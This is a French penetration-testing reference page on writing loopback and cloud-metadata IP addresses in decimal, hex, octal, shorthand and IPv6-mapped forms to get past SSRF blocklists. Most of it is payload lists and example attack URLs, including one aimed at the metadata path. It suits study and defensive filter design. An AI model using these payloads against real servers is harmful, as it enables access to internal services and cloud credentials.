---
title: "Encodages d'adresse IP pour contourner les filtres SSRF"
description: "Les adresses de loopback et de métadonnées peuvent être écrites sous forme décimale, octale, hexadécimale, IPv6-mappée et raccourcie qui résolvent vers le même hôte tout en déjouant une blocklist à correspondance de chaîne."
keywords:
  - contournement d'IP SSRF
  - IP décimale
  - IP octale
  - IP hexadécimale
  - IPv4-mapped IPv6
  - 169.254.169.254
  - contournement 127.0.0.1
---

# Adresse IP

Une blocklist qui rejette `127.0.0.1` et `169.254.169.254` en tant que chaînes littérales est déjouée en écrivant la même adresse d'une autre manière. Les parseurs de style `inet_aton`, le parseur d'URL du navigateur et la plupart des clients HTTP acceptent plusieurs formats numériques et les réduisent à la même valeur 32 bits, donc un encodage équivalent passe le filtre textuel et résout vers l'hôte interne.

## La loopback dans d'autres bases

`127.0.0.1` a de nombreuses formes égales. Le parseur réduit chacune à la même adresse :

```
2130706433            # decimal (dotless)
0x7f000001            # hex (dotless)
0x7f.0x0.0x0.0x1      # dotted hex
0177.0.0.1            # first octet in octal (0177 = 127)
0177.0000.0000.0001   # fully octal
127.1                 # shorthand: last part fills the remaining octets
127.0.1               # shorthand
```

`127.1` s'étend en `127.0.0.1` parce qu'une partie finale remplit tous les octets restants. L'adresse toutes-interfaces `0.0.0.0` atteint les services liés localement sur de nombreuses piles et constitue une faille fréquente de blocklist, tout comme le `0` nu, que plusieurs parseurs lisent comme `0.0.0.0`.

## L'adresse de métadonnées

L'endpoint link-local cloud `169.254.169.254` se réduit de la même façon, ce qui le fait glisser au-delà d'un filtre basé sur le littéral :

```
2852039166            # decimal
0xA9FEA9FE            # hex
0251.0376.0251.0376   # octal
[::ffff:169.254.169.254]   # IPv4-mapped IPv6
```

Un point final (`169.254.169.254.`) est aussi accepté par de nombreux résolveurs et contourne souvent une vérification d'égalité naïve.

## Formes IPv6 de la loopback

Là où le client supporte IPv6, la loopback a ses propres représentations, et une blocklist écrite uniquement pour IPv4 les manque :

```
[::1]                      # IPv6 loopback
[0:0:0:0:0:0:0:1]          # expanded
[::ffff:127.0.0.1]         # IPv4-mapped loopback
[::ffff:7f00:1]            # IPv4-mapped, hex tail
[0000::1]                  # leading-zero compression
```

## Mélanger les encodages

Les parseurs diffèrent dans les formats qu'ils acceptent et la manière dont ils les combinent, donc une valeur qu'un composant rejette, un autre la réduit. Combinez un hôte décimal sans points avec un scheme ou un port inattendu pour franchir à la fois un filtre d'hôte et un filtre de scheme d'un coup, par exemple `http://2130706433:80/` ou `http://0x7f000001/latest/meta-data/`. Lorsqu'un littéral est bloqué, parcourez tour à tour les formes décimale, hexadécimale, octale, raccourcie et IPv6-mappée ; un client qui se connecte tout court confirme laquelle la pile normalise.

## Outils

- **curl** : sonder chaque forme encodée directement pour voir laquelle le client HTTP réduit vers l'adresse interne.
- **SSRFmap** : exploitation SSRF automatisée qui parcourt les encodages d'IP alternatifs contre des cibles internes.
- Tests manuels avec Burp Repeater et payloads confectionnés.

## Références

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
